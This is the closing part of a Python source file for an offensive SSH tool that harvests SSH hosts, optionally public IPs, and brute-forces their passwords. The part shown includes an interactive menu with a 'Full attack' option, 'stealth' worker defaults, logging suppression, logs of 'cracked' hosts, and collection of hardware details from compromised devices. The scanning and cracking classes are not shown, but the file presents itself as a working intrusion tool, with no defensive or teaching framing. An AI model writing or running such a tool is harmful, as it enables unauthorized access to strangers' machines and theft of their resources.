                    info.get('storage', ''),
                    info.get('arch', ''),
                    info.get('uptime', ''),
                    info.get('model', ''),
                    result.get('timestamp', '')
                ])
        
        print(f"[+] Device information exported to: {csv_file}")
        print(f"[+] Total devices exported: {len(results)}")
        
    except Exception as e:
        print(f"[!] Error exporting to CSV: {e}")

def interactive_mode():
    """Interactive mode for the scanner"""
    print("\n" + "="*70)
    print("💀 SSH SCANNER ADVANCED - Interactive Mode (Huawei Compatible)")
    print("="*70)
    print("[*] Now with Huawei/Legacy SSH device support!")
    print("[*] Collects device info: RAM, CPU, OS, Storage, Network")
    print("="*70)
    
    while True:
        print("\n[?] What do you want to do?")
        print("  1) Collect SSH IPs (real-time save)")
        print("  2) Crack passwords on collected IPs")
        print("  3) Full attack (collect + crack)")
        print("  4) View cracked hosts")
        print("  5) Export device info to CSV")
        print("  6) Exit")
        
        choice = input("\nEnter choice (1-6): ").strip()
        
        if choice == '1':
            try:
                count = int(input("\n[?] How many SSH IPs to collect? "))
                port = input("[?] SSH port (default 22): ").strip() or "22"
                port = int(port)
                output = input("[?] Output file (default more.txt): ").strip() or "more.txt"
                workers = input("[?] Number of workers (default 50): ").strip() or "50"
                workers = int(workers)
                
                network = input("[?] Scan private networks only? (y/n, default y): ").strip().lower()
                private_only = network != 'n'
                
                scanner = SSHScanner(output_file=output)
                scanner.collect_ssh_ips(count, port, workers, private_only)
                
            except ValueError:
                print("[!] Invalid input")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
        
        elif choice == '2':
            try:
                input_file = input("\n[?] Input file with SSH hosts (default more.txt): ").strip() or "more.txt"
                
                custom_pass = input("[?] Use custom password list? (y/n, default n): ").strip().lower()
                password_file = None
                if custom_pass == 'y':
                    password_file = input("[?] Password file path: ").strip()
                
                success_file = input("[?] Success log file (default cracked.txt): ").strip() or "cracked.txt"
                workers = input("[?] Number of workers (default 3 for stealth): ").strip() or "3"
                workers = int(workers)
                
                print("[*] Note: Huawei/Legacy device support is ENABLED")
                print("[*] Note: Device info collection is ENABLED")
                
                tester = PasswordTester(password_file=password_file, success_file=success_file)
                tester.test_from_file(input_file, workers)
                
            except ValueError:
                print("[!] Invalid input")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
        
        elif choice == '3':
            try:
                count = int(input("\n[?] How many SSH IPs to collect? "))
                port = input("[?] SSH port (default 22): ").strip() or "22"
                port = int(port)
                output = input("[?] Output file (default more.txt): ").strip() or "more.txt"
                
                network = input("[?] Scan private networks only? (y/n, default y): ").strip().lower()
                private_only = network != 'n'
                
                # Collect
                print("\n" + ">"*70)
                print("STAGE 1: Collecting SSH IPs")
                print(">"*70)
                scanner = SSHScanner(output_file=output)
                scanner.collect_ssh_ips(count, port, 50, private_only)
                
                if scanner.ssh_hosts:
                    input("\n[+] Press Enter to start cracking...")
                    
                    custom_pass = input("\n[?] Use custom password list? (y/n, default n): ").strip().lower()
                    password_file = None
                    if custom_pass == 'y':
                        password_file = input("[?] Password file path: ").strip()
                    
                    success_file = input("[?] Success log file (default cracked.txt): ").strip() or "cracked.txt"
                    
                    # Crack
                    print("\n" + ">"*70)
                    print("STAGE 2: Cracking Passwords (Huawei compatible)")
                    print("[*] Collecting device info: RAM, CPU, OS, etc.")
                    print(">"*70)
                    tester = PasswordTester(password_file=password_file, success_file=success_file)
                    tester.test_from_file(output, 3)
                
            except ValueError:
                print("[!] Invalid input")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
        
        elif choice == '4':
            try:
                success_file = input("\n[?] Success log file (default cracked.txt): ").strip() or "cracked.txt"
                if os.path.exists(success_file):
                    with open(success_file, 'r') as f:
                        print(f"\n{'='*70}")
                        print(f"CRACKED HOSTS FROM: {success_file}")
                        print(f"{'='*70}\n")
                        print(f.read())
                else:
                    print(f"[!] File not found: {success_file}")
            except Exception as e:
                print(f"[!] Error: {e}")
        
        elif choice == '5':
            try:
                success_file = input("\n[?] Success log file (default cracked.txt): ").strip() or "cracked.txt"
                csv_file = input("[?] CSV output file (default device_info.csv): ").strip() or "device_info.csv"
                export_to_csv_from_file(success_file, csv_file)
            except Exception as e:
                print(f"[!] Error: {e}")
        
        elif choice == '6':
            print("\n[*] Exiting...")
            break
        
        else:
            print("[!] Invalid choice")

def main():
    import logging
    import warnings
    
    warnings.filterwarnings("ignore")
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    logging.getLogger().setLevel(logging.CRITICAL)
    
    parser = argparse.ArgumentParser(
        description='💀 SSH Scanner ADVANCED - Collects device info (RAM, CPU, OS)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Interactive mode:
    python3 ssh_scanner.py -i
  
  Collect 50 SSH IPs:
    python3 ssh_scanner.py collect -c 50
  
  Crack with custom passwords:
    python3 ssh_scanner.py test -P passwords.txt -S hacked.txt
  
  Device info collected:
    • RAM (total memory)
    • CPU (model and cores)
    • OS (distribution/version)
    • Storage (disk usage)
    • Hostname
    • Uptime
    • Architecture
    • Device model
  
Note: Now supports Huawei and legacy SSH devices!
        """
    )
    
    parser.add_argument(
        '-i', '--interactive',
        action='store_true',
        help='Run in interactive mode'
    )
    
    parser.add_argument(
        'mode',
        nargs='?',
        choices=['collect', 'test'],
        help='Mode: "collect" SSH IPs or "test" passwords'
    )
    
    parser.add_argument(
        '-c', '--count',
        type=int,
        help='Number of SSH hosts to collect'
    )
    
    parser.add_argument(
        '-p', '--port',
        type=int,
        default=22,
        help='SSH port (default: 22)'
    )
    
    parser.add_argument(
        '-o', '--output',
        default='more.txt',
        help='Output file (default: more.txt)'
    )
    
    parser.add_argument(
        '-P', '--passwords',
        help='Custom password file'
    )
    
    parser.add_argument(
        '-S', '--success',
        default='cracked.txt',
        help='Success log file (default: cracked.txt)'
    )
    
    parser.add_argument(
        '-w', '--workers',
        type=int,
        help='Number of workers'
    )
    
    parser.add_argument(
        '--public',
        action='store_true',
        help='Scan public IPs'
    )
    
    parser.add_argument(
        '--export-csv',
        help='Export device info to CSV file'
    )
    
    args = parser.parse_args()
    
    if args.interactive or not args.mode:
        interactive_mode()
        return
    
    if args.mode == 'collect':
        if not args.count:
            print("[!] --count required for collect mode")
            return
        
        workers = args.workers or 50
        scanner = SSHScanner(output_file=args.output)
        scanner.collect_ssh_ips(args.count, args.port, workers, not args.public)
    
    elif args.mode == 'test':
        workers = args.workers or 3
        tester = PasswordTester(password_file=args.passwords, success_file=args.success)
        tester.test_from_file(args.output, workers)
        
        # Export to CSV if requested
        if args.export_csv:
            tester.export_to_csv(args.export_csv)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
